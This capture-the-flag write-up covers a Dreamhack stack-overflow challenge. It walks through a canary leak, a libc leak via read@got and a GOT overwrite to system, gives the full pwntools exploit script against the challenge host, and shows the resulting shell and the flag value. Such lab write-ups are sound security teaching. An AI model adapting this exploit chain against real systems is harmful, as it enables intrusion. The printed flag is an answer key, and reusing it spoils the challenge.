### Overview
Take a look a the source code:
```py
// Name: rop.c
// Compile: gcc -o rop rop.c -fno-PIE -no-pie

#include <stdio.h>
#include <unistd.h>

int main() {
  char buf[0x30];

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Leak canary
  puts("[1] Leak Canary");
  write(1, "Buf: ", 5);
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Do ROP
  puts("[2] Input ROP payload");
  write(1, "Buf: ", 5);
  read(0, buf, 0x100);

  return 0;
}

```

We can see that our goal are leak canary and create a ROP chain to exploit this program.
Let's calculate the offset between canary and buffer:
```bash
   0x0000000000400779 <+130>:   call   0x4005f0 <read@plt>
   0x000000000040077e <+135>:   lea    rax,[rbp-0x40]
   0x0000000000400782 <+139>:   mov    rsi,rax
   0x0000000000400785 <+142>:   mov    edi,0x40088a
   0x000000000040078a <+147>:   mov    eax,0x0
   ...
   ...
   0x00000000004007cd <+214>:   mov    rcx,QWORD PTR [rbp-0x8]
   0x00000000004007d1 <+218>:   xor    rcx,QWORD PTR fs:0x28
   0x00000000004007da <+227>:   je     0x4007e1 <main+234>
   0x00000000004007dc <+229>:   call   0x4005d0 <__stack_chk_fail@plt>
   0x00000000004007e1 <+234>:   leave
   0x00000000004007e2 <+235>:   ret
```
The offset between canary and buffer is ``0x40 - 0x8 = 56 bytes``.
We will send 57 bytes to everwrite the first byte of canary and get its value from the screen.

Next, we will create ROP chain. Let's check all ROP gadget we have in this program:
```bash
gef➤  !ROPgadget --binary rop | grep "pop rdi"
0x0000000000400853 : pop rdi ; ret
gef➤  !ROPgadget --binary rop | grep "pop rsi"
0x0000000000400851 : pop rsi ; pop r15 ; ret
gef➤  !ROPgadget --binary rop | grep "ret"
0x0000000000400596 : ret
```
And some ``plt`` functions like ``read and write`` that will be helpful in this challenge:
```bash
gef➤  info functions @plt
All functions matching regular expression "@plt":

Non-debugging symbols:
0x00000000004005b0  puts@plt
0x00000000004005c0  write@plt
0x00000000004005d0  __stack_chk_fail@plt
0x00000000004005e0  printf@plt
0x00000000004005f0  read@plt
```
We have ``read@plt`` function, so to execute this function, we need to know the value of ``read@got`` which is the address of real ``read`` in libc.

After that, we will have lib base address from that, and it is easy to know the address of system in libc by the fixed offset in libc.

Know the address of system in libc, we can change the value of ``read@got`` point to the address of ``system`` in libc.

And when we execute ``read@plt``, it means that we execute ``system@plt``, and get shell to cat flag.

### Exploitation
```py
#!/usr/bin/env python3
from pwn import *
p= remote("host8.dreamhack.games", 22495)
e= ELF("./rop")
lib = ELF("./libc.so.6")
# first, send buffer to leak canary
buf = b'A'*0x39
p.sendafter(b'Buf: ', buf)
p.recvuntil(buf)
canary = u64(b'\x00' + p.recvn(7))
print('canary', hex(canary))
# find address of ROP gadget
pop_rdi = 0x0000000000400853
ret = 0x0000000000400596
pop_rsi_r15 = 0x0000000000400851

readplt = e.plt['read']
readgot = e.got['read']
writeplt = e.plt['write']

# write(1, read_got, 8) print out the value of read@got which is point to the read() address in libc
payload = b"A"*56 + p64(canary)*2 # overwrite canary and saved rbp
payload += p64(pop_rdi) + p64(1) 
payload += p64(pop_rsi_r15) + p64(readgot) + p64(0)
payload += p64(writeplt)

#change read@got point to -> system in libc after leak lib base
# read@plt(0, read@got, 8)
# read from input and store in read@got, we will send system address from input here
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(readgot) + p64(0)
payload += p64(readplt) 

# read(binsh) send /bin/sh which will be stored in read@got + 8 
# because we send it right after system address in line 129
payload += p64(pop_rdi) + p64(readgot + 0x8)
payload += p64(ret)
payload += p64(readplt) # call read@plt which was changed to system@plt

p.sendafter(b"Buf: ", payload)
readlib = u64(p.recvn(6) + b'\x00\x00') # receive 6 bytes of read function in libc
libase = readlib - lib.symbols['read'] # calculate lib base by known offset
system = libase + lib.symbols['system'] # system address in libc
print('read', readlib)
print('libc_base', libase)
print('system', system)
p.send(p64(system) + b"/bin/sh\x00")  

p.interactive()

```
### Result
```bash
$ python3 exploi.py 
canary 0x52a8ff29f2bd4200
read 140649870154112
libc_base 140649869021184
system 140649869352288
[*] Switching to interactive mode
\x00\x00p&\x83\x99\xeb\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\xb7\x9c\x99\xeb\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa0\xaa\x9c\x99\xeb\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$ ls
flag
rop
run.sh
$ cat flag
DH{8056b333681caa09d67d1d7aa48a3586ef867de0ac3b778c9839d449d4fcb0cf}
[*] Got EOF while reading in interactive
```